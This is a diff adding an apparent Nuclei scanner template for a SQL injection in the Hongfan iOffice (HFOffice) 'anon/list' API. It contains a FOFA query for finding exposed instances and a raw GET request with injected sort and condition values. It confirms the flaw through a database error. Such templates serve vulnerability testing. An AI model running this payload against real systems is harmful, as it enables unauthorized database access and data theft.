@@ -1,0 +1,26 @@
+id: hongfan-ioffice-sqli-anon-list
+
+info:
+  name: "红帆 ioffice anon 接口 SQL 注入漏洞"
+  author: 0dayPoc
+  severity: high
+  description: |-
+    fofa: body="./config/pc-app-config.js" && title="HFOffice" || app="红帆-ioffice"
+      红帆HFOffice系统anon接口存在SQL注入安全缺陷。攻击者可通过构造恶意SQL负载，触发注入点并执行任意数据库查询，导致敏感数据泄露、数据篡改或系统权限被滥用。
+  tags: 红帆
+
+http:
+- raw:
+  - |
+    GET /api/portal-public-link/anon/list?sorts=[{"Field":"SortID","SortBy":2},{"Field":'1',"SortBy":'1'}]&conditions=[{"Field":"IsEnable","DataType":1,"Option":1,"Value":'user'},{"Field":"Module","DataType":1,"Option":7,"Value":"1"}] HTTP/1.1
+    Host: {{Hostname}}
+    Accept-Encoding: gzip
+    Connection: close
+  matchers-condition: and
+  matchers:
+  - type: status
+    status: [400]
+  - type: word
+    part: body
+    words:
+    - 'nvarchar'
